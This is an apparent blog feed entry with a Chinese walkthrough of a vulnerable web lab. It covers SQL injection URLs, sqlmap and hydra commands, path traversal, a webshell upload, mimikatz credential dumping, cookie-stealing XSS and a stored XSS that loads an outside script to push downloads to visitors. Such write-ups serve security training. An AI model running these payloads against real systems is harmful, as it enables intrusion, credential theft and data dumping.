    <id>http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/20190225-2df38590.html</id>
    <published>2019-02-25T07:32:06.000Z</published>
    <updated>2021-04-08T03:18:06.360Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="第一关-很简单的一个注入"><a href="#第一关-很简单的一个注入" class="headerlink" title="第一关-很简单的一个注入"></a>第一关-很简单的一个注入</h2><blockquote><p>普通的GET注入</p></blockquote><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li>Firefox 48.0</li></ul><ul><li>Firefox插件:<ul><li>hackbar</li></ul></li></ul><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>猜想当前表中列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 失败:</span><br><span class="line">  http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= 2&apos;order by 5 %23</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 成功:</span><br><span class="line">  http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= 2&apos;order by 4 %23</span><br><span class="line"></span><br><span class="line">// 结论：表中存在4列属性</span><br></pre></td></tr></table></figure><p>获取表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=‘-1&apos; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database() %23</span><br></pre></td></tr></table></figure><p><img src="/images/1_1.png" alt="获取表"></p><p>获取当前数据库名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=‘-1&apos; union select 1,database(),3,4 --&apos;</span><br></pre></td></tr></table></figure><p><img src="/images/1_2.png" alt="获取当前数据库名称"></p><p>获取<code>flag</code>表的所有列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= -1&apos; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = &apos;flag&apos; %23</span><br></pre></td></tr></table></figure><p><img src="/images/1_3.png" alt="获取flag表的所有列"></p><p>获取<code>flag</code>表的中列的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= -1&apos; union select 1,flag,3,4 from flag %23</span><br></pre></td></tr></table></figure><p><img src="/images/1_4.png" alt="获取flag表的中列的值"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><ul><li>python 2.7.15</li><li>sqlmap</li></ul><h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><p>获取当前数据库名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid --current-db</span><br></pre></td></tr></table></figure><p><img src="/images/1_5.png" alt="获取当前数据库名称"></p><p>获取当前数据库的所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid -D  pentesterlab --tables</span><br></pre></td></tr></table></figure><p><img src="/images/1_6.png" alt="获取当前数据库名称"></p><p>获取<code>flag</code>表中的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid -D pentesterlab -T flag --dump</span><br></pre></td></tr></table></figure><p><img src="/images/1_7.png" alt="获取当前数据库名称"></p><hr><h2 id="第二关-从图片中你能找到什么？"><a href="#第二关-从图片中你能找到什么？" class="headerlink" title="第二关-从图片中你能找到什么？"></a>第二关-从图片中你能找到什么？</h2><blockquote><p>从图片中找到有用的信息</p></blockquote><h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><ul><li>CMD</li><li>360压缩</li></ul><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>右键保存图片</p></li><li><p>修改图片后缀名为zip</p></li><li><p>解压得到txt文本文件</p></li></ol><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h4><ul><li>图片: 1.jpg</li><li>文本: 1.txt<h4 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h4></li><li>CMD</li><li>360压缩</li></ul><h4 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤"></a>步骤</h4><ol><li>准备一张图片和一个文本</li></ol><p><img src="/images/2_1.png" alt="1.jpg与1.txt"></p><ol start="2"><li>将<code>1.txt</code>压缩成<code>1.zip</code></li></ol><p><img src="/images/2_2.png" alt="压缩1.txt"></p><ol start="3"><li>将<code>1.jpg</code>和<code>1.zip</code>合并成为<code>2.jpg</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b 1.jpg+1.zip   2.jpg</span><br></pre></td></tr></table></figure><p><img src="/images/2_3.png" alt="执行CMD命令"></p><p><img src="/images/2_4.png" alt="结果"></p><ol start="4"><li>将<code>2.jpg</code>的后缀改为<code>2.rar</code>，从<code>rar</code>压缩里面可以看到一个<code>1.txt</code>文件</li></ol><p>改为<code>zip</code>的话，在<code>win10</code>上有时会出现错误，推荐<code>rar</code></p><p><img src="/images/2_5.png" alt="结果"></p><hr><h2 id="第三关-你看到了什么？"><a href="#第三关-你看到了什么？" class="headerlink" title="第三关-你看到了什么？"></a>第三关-你看到了什么？</h2><blockquote><p>渗透网站的时候目录也很重要</p></blockquote><h3 id="工具-4"><a href="#工具-4" class="headerlink" title="工具"></a>工具</h3><ul><li>御剑</li><li>MD5在线加密解密</li></ul><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤"></a>步骤</h3><p>获取当前<code>URL</code>的部分文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//目标链接:</span><br><span class="line">http://169.254.91.186/pentest/test/san/index33.htm</span><br></pre></td></tr></table></figure><p><img src="/images/3_1.png" alt="得到test文件目录"></p><p>访问<code>test</code></p><p><img src="/images/3_2.png" alt="结果"></p><p>尝试用<code>md5</code>加密<code>test</code></p><p><img src="/images/3_3.png" alt="结果"></p><p>访问经过16位加密后的test的网址</p><p><img src="/images/3_4.png" alt="结果"></p><hr><h2 id="第四关-告诉你了FLANG是5位数"><a href="#第四关-告诉你了FLANG是5位数" class="headerlink" title="第四关-告诉你了FLANG是5位数"></a>第四关-告诉你了FLANG是5位数</h2><blockquote><p>暴力破解登录</p></blockquote><h3 id="工具-5"><a href="#工具-5" class="headerlink" title="工具"></a>工具</h3><ul><li>Firefox 48.0</li></ul><ul><li>Firefox插件:<ul><li>hackbar</li><li>hydra</li></ul></li></ul><ul><li>user.txt</li><li>password.txt</li></ul><p>用 hackbar 尝试获取 Post data 值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.91.186/pentest/test/b2e16da5985ee1be/login.php</span><br></pre></td></tr></table></figure><p><img src="/images/4_1.png" alt="hackbar"></p><p>准备存放常见用户名的文本user.txt和存放常见密码的文本passwd.txt</p><p>使用user.txt用户名文本和passwd.txt文本文本对无验证码且弱口令的登陆页面进行暴力破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt -o output.log -vV -t 10  -f 169.254.91.186 http-post-form &quot;/pentest/test/b2e16da5985ee1be/login.php:username=^USER^&amp;pwd=^PASS^:login failure&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/4_2.png" alt="结果"></p><hr><h2 id="第五关-一个优点小小的特殊的注入"><a href="#第五关-一个优点小小的特殊的注入" class="headerlink" title="第五关-一个优点小小的特殊的注入"></a>第五关-一个优点小小的特殊的注入</h2><blockquote><p>头部的一个注入</p></blockquote><h3 id="工具-6"><a href="#工具-6" class="headerlink" title="工具"></a>工具</h3><ul><li>Firefox 48.0</li></ul><ul><li>Firefox 插件:<ul><li>Modify Headers</li></ul></li></ul><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤"></a>步骤</h3><p>使用 <code>Modify Headers</code> 来进行<code>HTTP</code>头注入，常见的有获取客户端<code>IP</code>,<code>http-client-ip</code>,<code>x_forwarded_for</code> 等</p><p><img src="/images/5_1.png" alt="使用Modify Headers 来进行HTTP头注入"></p><p><img src="/images/5_2.png" alt="点击start并刷新页面"></p><p><img src="/images/5_3.png" alt="可知当前表有4列"></p><h3 id="获取当前数据库名称"><a href="#获取当前数据库名称" class="headerlink" title="获取当前数据库名称"></a>获取当前数据库名称</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="/images/5_4.png" alt="可知当前表有4列"></p><p>获取当前表所在数据库的所有表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p><img src="/images/5_5.png" alt="获取当前表所在数据库的所有表"></p><p>获取flag表所有列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'flag'</span></span><br></pre></td></tr></table></figure><p><img src="/images/5_6.png" alt="获取flag表所有列"></p><p>获取flag表中某属性的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,flag,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><p><img src="/images/5_6.png" alt="获取flag表中flag的值"></p><hr><h2 id="第六关-这关需要RMB购买哦"><a href="#第六关-这关需要RMB购买哦" class="headerlink" title="第六关-这关需要RMB购买哦"></a>第六关-这关需要RMB购买哦</h2><blockquote><p>支付问题:用最少的钱去购买到一本书！</p></blockquote><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><h4 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤"></a>步骤</h4><p>密码在第七关的入口,也可以尝试暴力破解:</p><p><img src="/images/6_1.png" alt="获取账号密码"></p><p>输入负数</p><p><img src="/images/6_2.png" alt="获取账号密码"></p><h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><h4 id="工具-7"><a href="#工具-7" class="headerlink" title="工具"></a>工具</h4><ul><li>Burp Suite</li></ul><h4 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤"></a>步骤</h4><p>先开启<code>Burp Suite</code>的代理，截断包的发送，然后输入要购买的数量，然后点击购买</p><p><img src="/images/6_3.png" alt="开启代理"></p><p>在Params处，可以看到发送的包的值</p><p><img src="/images/6_4.png" alt="查看包"></p><p>抓包,改包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 猜想:</span><br><span class="line">  0.1 * 50 = 5</span><br><span class="line">  0.2 * 100 = 20</span><br><span class="line">  5 + 20 = 25</span><br></pre></td></tr></table></figure><p><img src="/images/6_5.png" alt="改包"></p><p>解除代理，查看结果</p><p><img src="/images/6_6.png" alt="改包结果"></p><hr><h2 id="第七关-越权"><a href="#第七关-越权" class="headerlink" title="第七关-越权"></a>第七关-越权</h2><h3 id="工具-8"><a href="#工具-8" class="headerlink" title="工具"></a>工具</h3><ul><li>Burp suite</li></ul><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤"></a>步骤</h3><p>使用入口提供的账号密码登录,点击修改密码</p><p>发现在密码修改页面的url中带有name字样</p><p><img src="/images/7_1.png" alt="change.php?name=tom"></p><p>测试修改密码发现没有进行旧密码验证和当前用户判断</p><p><img src="/images/7_2.png" alt="修改密码后"></p><p>修改url</p><p><img src="/images/7_3.png" alt="?name=admin"></p><p>提交前，开启代理，点击提交，修改包，解除代理</p><p><img src="/images/7_4_1.png" alt="改包"></p><p><img src="/images/7_4.png" alt="解除代理结果"></p><hr><h2 id="第八关-CSRF"><a href="#第八关-CSRF" class="headerlink" title="第八关-CSRF"></a>第八关-CSRF</h2><blockquote><p>管理员每天晚上十点上线！</p></blockquote><h3 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h3><h4 id="工具-9"><a href="#工具-9" class="headerlink" title="工具"></a>工具</h4><ul><li>Burp suite</li></ul><h4 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤"></a>步骤</h4><p>用<code>tom</code>登录,进入主页</p><p><img src="/images/8_0.png" alt="tom"></p><p>点击“更改密码”</p><blockquote><p>源php文件无法进行修改密码操作，已更改</p></blockquote><p><img src="/images/8_1.png" alt="更改密码"></p><p>源码已更正,允许修改密码,再次进入更改密码界面</p><p><img src="/images/8_2.png" alt="密码修改结果"></p><p>开启代理，输入密码：<code>klklkl</code>，点击“更改密码”</p><p><img src="/images/8_3.png" alt="使用Burp Suite"></p><p>修改<code>username</code>的值为<code>admin</code>，然后构造</p><p><img src="/images/8_4.png" alt="构造CSRF"></p><p>制作对应的网页，或者test一下</p><p><img src="/images/8_5.png" alt="CSRF"></p><p>制作网页</p><p><img src="/images/8_6.png" alt="等待点击"></p><h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h3><p>看了一眼源码，发现没有对当前用户进行判断，其实直接利用：<a href="http://169.254.91.186/pentest/test/4/change.php?name=admin然后更改密码就行。em..." rel="external nofollow noopener noreferrer" target="_blank">http://169.254.91.186/pentest/test/4/change.php?name=admin然后更改密码就行。em...</a>.</p><hr><h2 id="第九关-URL跳转"><a href="#第九关-URL跳转" class="headerlink" title="第九关-URL跳转"></a>第九关-URL跳转</h2><blockquote><p>能不能从我到百度那边去？</p></blockquote><h3 id="工具-10"><a href="#工具-10" class="headerlink" title="工具"></a>工具</h3><ul><li>Firefox 48.0</li><li>Firefox插件:<ul><li>hackbar</li></ul></li></ul><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤"></a>步骤</h3><p>没头绪，看源码</p><p><img src="/images/9_1.png" alt="webug源码"></p><p>填写<code>?url=http://www.baidu.com</code></p><p><img src="/images/9_2.png" alt="?url=http://www.baidu.com"></p><p>跳转url</p><p><img src="/images/9_3.png" alt="尝试跳转"></p><blockquote><p>备注：若出现不安全链接提示，直接关闭代理即可</p></blockquote><p><img src="/images/9_4.png" alt="关闭代理"></p><hr><h2 id="第十关-文件下载"><a href="#第十关-文件下载" class="headerlink" title="第十关-文件下载"></a>第十关-文件下载</h2><blockquote><p>根据提示下载需要的文件</p></blockquote><h3 id="工具-11"><a href="#工具-11" class="headerlink" title="工具"></a>工具</h3><ul><li><p>御剑</p></li><li><p>burp suite / hackbar</p></li></ul><h3 id="步骤-11"><a href="#步骤-11" class="headerlink" title="步骤"></a>步骤</h3><ol><li>点击进来发现目录不正确，回到上一级：<code>http://192.168.246.128/pentest/test/6/1d95a598d0bd1a3a/</code></li></ol><p><img src="/images/mk-2020-03-17-20-54-25.png" alt></p><ol start="2"><li>发现 6 的目录下有 1 这个目录，但里面是空的</li></ol><p><img src="/images/mk-2020-03-17-20-55-13.png" alt></p><ol start="3"><li>用御剑扫描一下目录，发现 <code>download.php</code></li></ol><p><img src="/images/mk-2020-03-17-20-55-29.png" alt></p><ol start="4"><li>访问 <code>download.php</code>：<code>http://192.168.246.128/pentest/test/6/1/download.php</code></li></ol><p><img src="/images/mk-2020-03-17-20-56-54.png" alt></p><ol start="5"><li>点击下载，虽然下载不了，但是发现标题瞩目</li></ol><p><img src="/images/mk-2020-03-17-20-57-09.png" alt></p><ol start="6"><li>标题和数据库有关，联想刚刚扫描到的目录</li></ol><p><img src="/images/mk-2020-03-17-20-57-43.png" alt></p><ol start="7"><li>扫描目录，得到 <code>config.php</code></li></ol><p><img src="/images/mk-2020-03-17-20-58-00.png" alt></p><ol start="8"><li>一般不直接访问，这里直接访问，发现还有语法错误</li></ol><p><img src="/images/mk-2020-03-17-20-58-10.png" alt></p><p>此时，有两种方法获取账号密码：</p><h4 id="方法一-3"><a href="#方法一-3" class="headerlink" title="方法一"></a>方法一</h4><ol start="9"><li>回到下载的地方，抓一下包</li></ol><p><img src="/images/mk-2020-03-17-20-59-38.png" alt></p><ol start="10"><li>根据<code>config.php</code>所在的相对路径，修改<code>value</code>值：<code>../../../pentest/test/6/1/db/Config.php</code>，指向<code>config.php</code></li></ol><p><img src="/images/mk-2020-03-17-21-00-24.png" alt></p><ol start="11"><li>取消代理，获取文件</li></ol><p><img src="/images/mk-2020-03-17-21-00-40.png" alt></p><ol start="12"><li>得到有关账号密码的信息</li></ol><p><img src="/images/mk-2020-03-17-21-00-58.png" alt></p><h4 id="方法二-3"><a href="#方法二-3" class="headerlink" title="方法二"></a>方法二</h4><ol start="9"><li>因为用的是<code>get</code>方式，所以也可以通过修改<code>url</code>来达到目的</li></ol><p><img src="/images/mk-2020-03-17-21-01-21.png" alt></p><ol start="10"><li>直接使用<code>hackbar</code>构建<code>url</code>：<code>../../../pentest/test/6/1/db/Config.php</code>，得到<code>config.php</code>文件</li></ol><p><img src="/images/mk-2020-03-17-21-01-43.png" alt></p><ol start="11"><li>得到有关账号密码的信息</li></ol><p><img src="/images/mk-2020-03-17-21-01-59.png" alt></p><hr><h2 id="第十一关-我和上一关有点像"><a href="#第十一关-我和上一关有点像" class="headerlink" title="第十一关-我和上一关有点像"></a>第十一关-我和上一关有点像</h2><blockquote><p>boom，沙卡拉卡！</p></blockquote><h3 id="工具-12"><a href="#工具-12" class="headerlink" title="工具"></a>工具</h3><ul><li><p>御剑</p></li><li><p>burp suite / hackbar</p></li></ul><h3 id="步骤-12"><a href="#步骤-12" class="headerlink" title="步骤"></a>步骤</h3><ol><li>看起来和第十关有点类似</li></ol><p><img src="/images/mk-2020-03-17-21-18-27.png" alt></p><ol start="2"><li>用御剑扫描当前目录</li></ol><p><img src="/images/mk-2020-03-17-21-18-59.png" alt></p><ol start="3"><li>继续扫描<code>db</code>目录</li></ol><p><img src="/images/mk-2020-03-17-21-19-09.png" alt></p><ol start="4"><li>用的是<code>post</code>，那只能改<code>post</code>包了</li></ol><p><img src="/images/mk-2020-03-17-21-19-34.png" alt></p><ol start="5"><li>抓包，改包，获得<code>config.php</code></li></ol><p><img src="/images/mk-2020-03-17-21-19-48.png" alt></p><ol start="6"><li>查看<code>config.php</code>文件，可以看到类似账号密码的信息</li></ol><p><img src="/images/mk-2020-03-17-21-20-02.png" alt></p><hr><h2 id="第十二关-我系统密码忘记了！"><a href="#第十二关-我系统密码忘记了！" class="headerlink" title="第十二关-我系统密码忘记了！"></a>第十二关-我系统密码忘记了！</h2><blockquote><p>请帮我找回在 D 盘下</p></blockquote><h3 id="工具-13"><a href="#工具-13" class="headerlink" title="工具"></a>工具</h3><ul><li><p>菜刀</p></li><li><p>mimikatz.exe</p></li></ul><h3 id="步骤-13"><a href="#步骤-13" class="headerlink" title="步骤"></a>步骤</h3><ol><li>用之前的 <code>tom</code> 来登陆</li></ol><p><img src="/images/mk-2020-03-17-21-28-58.png" alt></p><ol start="2"><li>主页</li></ol><p><img src="/images/mk-2020-03-17-21-29-12.png" alt></p><ol start="3"><li>发现上传功能，构建 <code>php</code>，上传</li></ol><p><img src="/images/mk-2020-03-17-21-29-30.png" alt></p><ol start="4"><li>上传 <code>go.php</code> 成功，在 8 目录下的 <code>upload</code> 文件夹中</li></ol><p><img src="/images/mk-2020-03-17-21-29-46.png" alt></p><ol start="5"><li>在菜刀空白处右键新建连接</li></ol><p><img src="/images/mk-2020-03-17-21-29-59.png" alt></p><ol start="6"><li>填写 <code>php</code> 所在 <code>web</code> 树目录即 <code>php</code> 文件中 <code>post</code> 的值，由于 <code>go.php</code> 中填写的是 <code>ee</code>，所以这里也是，完成后，添加</li></ol><p><img src="/images/mk-2020-03-17-21-35-24.png" alt></p><ol start="7"><li>选择刚刚创建的 <code>shell</code>，右键选择文件管理</li></ol><p><img src="/images/mk-2020-03-17-21-35-37.png" alt></p><ol start="8"><li>可以看到已经可以管理服务器的文件，通过右键可以进行下载等操作</li></ol><p><img src="/images/mk-2020-03-17-21-35-54.png" alt></p><ol start="9"><li>由于题目要求是找回系统账号密码，遵守游戏规则，使用 <code>mimikatz</code> 来获取系统账号密码，先上传 <code>mimikatz</code> 组件。</li></ol><p><img src="/images/mk-2020-03-17-21-36-10.png" alt></p><ol start="10"><li><p><code>mimikatz</code> 使用起来也非常简单，提取 <code>Windows</code> 系统的明文密码只需两行命令：</p><p>提权：<code>privilege::debug</code></p><p>输出系统账号密码：<code>sekurlsa::logonpasswords</code></p></li><li><p>右键 <code>shell</code>，选择虚拟终端，执行命令：<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt</code>，执行 <code>mimikatz</code>，提权并获取系统账号密码，最后导出到 <code>txt</code> 文本上</p></li></ol><p><img src="/images/mk-2020-03-17-21-37-27.png" alt></p><ol start="12"><li>在文件管理中可以看到 <code>password.txt</code> 文件</li></ol><p><img src="/images/mk-2020-03-17-21-37-37.png" alt></p><ol start="13"><li>可以下载或者双击打开查看，成功获取系统账号密码</li></ol><p><img src="/images/mk-2020-03-17-21-37-50.png" alt></p><h3 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h3><ol><li>可以在配置中对数据库的信息进行配置，以获取对数据库操作的权限</li></ol><p><img src="/images/mk-2020-03-17-21-38-19.png" alt></p><ol start="2"><li>选择刚刚修改的 <code>shell</code>，右键选择数据库管理</li></ol><p><img src="/images/mk-2020-03-17-21-38-29.png" alt></p><hr><h2 id="第十三关-XSS"><a href="#第十三关-XSS" class="headerlink" title="第十三关-XSS"></a>第十三关-XSS</h2><blockquote><p>看看你能给我带来什么惊喜</p></blockquote><h3 id="工具-14"><a href="#工具-14" class="headerlink" title="工具"></a>工具</h3><ul><li>hackbar</li></ul><h3 id="步骤-14"><a href="#步骤-14" class="headerlink" title="步骤"></a>步骤</h3><ol><li>主页：<code>http://192.168.246.128/pentest/test/9/</code></li></ol><p><img src="/images/mk-2020-03-17-21-44-18.png" alt></p><ol start="2"><li>666</li></ol><p><img src="/images/mk-2020-03-17-21-44-33.png" alt></p><ol start="3"><li>555</li></ol><p><img src="/images/mk-2020-03-17-21-44-41.png" alt></p><ol start="4"><li>反射型<code>XSS</code>，构建<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li></ol><p><img src="/images/mk-2020-03-17-21-45-11.png" alt></p><hr><h2 id="第十四关-存储型XSS"><a href="#第十四关-存储型XSS" class="headerlink" title="第十四关-存储型XSS"></a>第十四关-存储型XSS</h2><blockquote><p>suprise！</p></blockquote><h3 id="步骤-15"><a href="#步骤-15" class="headerlink" title="步骤"></a>步骤</h3><ol><li>主页：发现没有检测对输入进行过滤 js</li></ol><p><img src="/images/mk-2020-03-17-21-47-56.png" alt></p><ol start="2"><li>存储型 XSS：构建一个<code>&lt;script&gt;&lt;/script&gt;</code>，这里使用的是<code>&lt;script src=&quot;xxx.js&quot;&gt;&lt;/script&gt;</code>，此处为本人的域名下的一个 js 脚本，用以下载文件</li></ol><p><img src="/images/mk-2020-03-17-21-48-08.png" alt></p><ol start="3"><li>此处的 js 操作执行会下载一个东西，由于是存储型 xss，每个访客访问该网址都会默认下载一个东西</li></ol><p><img src="/images/mk-2020-03-17-21-49-57.png" alt></p><hr><h2 id="第十五关-什么？图片上传不了？"><a href="#第十五关-什么？图片上传不了？" class="headerlink" title="第十五关-什么？图片上传不了？"></a>第十五关-什么？图片上传不了？</h2><blockquote><p>上传不了图片怎么办？</p></blockquote><h3 id="工具-15"><a href="#工具-15" class="headerlink" title="工具"></a>工具</h3><ul><li><p>御剑</p></li><li><p>burp suite</p></li></ul><h3 id="步骤-16"><a href="#步骤-16" class="headerlink" title="步骤"></a>步骤</h3><ol><li>要求上传图片</li></ol><p><img src="/images/mk-2020-03-17-22-01-05.png" alt></p><ol start="2"><li>上传图片</li></ol><p><img src="/images/mk-2020-03-17-22-01-22.png" alt></p><ol start="3"><li>上传非图片格式</li></ol><p><img src="/images/mk-2020-03-17-22-01-37.png" alt></p><ol start="4"><li>验证一下是否上传成功，猜一下是否上传到当前目录，扫描目录，发现 <code>upload</code> 文件夹</li></ol><p><img src="/images/mk-2020-03-17-22-01-57.png" alt></p><ol start="5"><li>把上传的文件加入 <code>DIR.txt</code> 字典中，然后扫描一下 <code>upload</code> 文件夹，是否存在刚刚上传的文件。发现是个坑。显然图片可以经过了验证，但同样拒绝了图片的上传。</li></ol><p><img src="/images/mk-2020-03-17-22-02-14.png" alt></p><ol start="6"><li>图片格式：<code>Content-Type: image/png</code></li></ol><p><img src="/images/mk-2020-03-17-22-02-28.png" alt></p><ol start="7"><li>上传 <code>php</code> 文件，把 <code>Content-Type: application/octet-stream</code> 修改为 <code>Content-Type: image/png</code></li></ol><p><img src="/images/mk-2020-03-17-22-02-43.png" alt></p><ol start="8"><li>成功上传，准备执行它</li></ol><p><img src="/images/mk-2020-03-17-22-02-56.png" alt></p><ol start="9"><li>成功执行</li></ol><p><img src="/images/mk-2020-03-17-22-03-07.png" alt></p><hr><h2 id="第十六关-明天双十一"><a href="#第十六关-明天双十一" class="headerlink" title="第十六关-明天双十一"></a>第十六关-明天双十一</h2><blockquote><p>我从公司网络去剁手了</p></blockquote><h3 id="工具-16"><a href="#工具-16" class="headerlink" title="工具"></a>工具</h3><ul><li>burp suite</li></ul><h3 id="步骤-17"><a href="#步骤-17" class="headerlink" title="步骤"></a>步骤</h3><ol><li>正常模式：<code>http://192.168.246.128/pentest/test/12/</code></li></ol><p><img src="/images/mk-2020-03-17-22-07-13.png" alt></p><ol start="2"><li>点击一下<code>Go</code>，发现<code>url</code>多了一个<code>?url=</code></li></ol><p><img src="/images/mk-2020-03-17-22-07-26.png" alt></p><ol start="3"><li>点击<code>pass</code>则显示</li></ol><p><img src="/images/mk-2020-03-17-22-07-38.png" alt></p><ol start="4"><li>输入<code>www.taobao.com</code>看看</li></ol><p><img src="/images/mk-2020-03-17-22-07-57.png" alt></p><ol start="5"><li>显示只允许特定<code>ip</code></li></ol><p><img src="/images/mk-2020-03-17-22-08-08.png" alt></p><ol start="6"><li>输入<code>10.10.10.10</code>后则显示</li></ol><p><img src="/images/mk-2020-03-17-22-08-22.png" alt></p><ol start="7"><li>输入<code>www.taobao.com</code>，查看<code>burp</code></li></ol><p><img src="/images/mk-2020-03-17-22-08-33.png" alt></p><ol start="8"><li><p>把<code>HOST</code>改成<code>10.10.10.10</code></p><p><code>Host</code>：初始<code>URL</code>中的主机和端口。</p></li></ol><p><img src="/images/mk-2020-03-17-22-08-59.png" alt></p><ol start="9"><li>显示<code>nonono</code></li></ol><p><img src="/images/mk-2020-03-17-22-09-15.png" alt></p><ol start="10"><li><p>把<code>Referer</code>改为<code>www.taobao.com</code></p><p><code>HTTP Referer</code>是<code>header</code>的一部分，当浏览器向<code>web</code>服务器发送请求的时候，一般会带上<code>Referer</code>，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><p><img src="/images/mk-2020-03-17-22-09-41.png" alt></p></li><li><p>em…</p></li></ol><p><img src="/images/mk-2020-03-17-22-09-56.png" alt></p><ol start="12"><li>看源码，发现是我的来源应该是<code>www.baidu.com</code></li></ol><p><img src="/images/mk-2020-03-17-22-10-12.png" alt></p><ol start="13"><li>em…把<code>Refer</code>改为<code>http://www.baidu.com</code>，此时<code>GET</code>还是<code>www.taobao.com</code>，<code>Host</code>为<code>10.10.10.10</code></li></ol><p><img src="/images/mk-2020-03-17-22-10-28.png" alt></p><ol start="14"><li>em…得到了<code>flag</code></li></ol><p><img src="/images/mk-2020-03-17-22-11-28.png" alt></p><ol 